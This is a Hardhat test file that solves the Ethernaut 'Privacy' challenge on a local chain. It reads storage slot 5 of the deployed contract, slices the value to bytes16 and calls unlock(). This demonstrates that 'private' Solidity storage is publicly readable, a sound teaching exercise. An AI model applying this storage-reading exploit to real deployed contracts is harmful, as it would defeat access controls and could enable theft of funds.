const { assert, expect } = require("chai")
const { network, deployments, ethers, getNamedAccounts } = require("hardhat")
const {
    developmentChains,
    networkConfig,
} = require("../../helper-hardhat-config")

const parseEther = ethers.utils.parseEther
const formatEther = ethers.utils.formatEther
const getBalance = ethers.provider.getBalance
const bytes32 = ethers.utils.formatBytes32String

if (!developmentChains.includes(network.name)) {
    describe.skip
} else {
    describe("ethernaut_privacy Unit Tests", function () {
        let owner, user1, Privacy
        beforeEach(async () => {
            ;[owner, user1] = await ethers.getSigners()
            const PrivacyContract = await ethers.getContractFactory("Privacy")
            Privacy = await PrivacyContract.deploy([
                bytes32("abc"),
                bytes32("qweasd"),
                bytes32("123456"),
            ])
        })

        describe("break it", () => {
            it("default attack", async function () {
                let slot = await ethers.provider.getStorageAt(
                    Privacy.address,
                    5
                )
                // bytes32 => bytes16
                await Privacy.unlock(slot.slice(0, 34))
                expect(await Privacy.locked()).to.equal(false)
            })
        })
    })
}
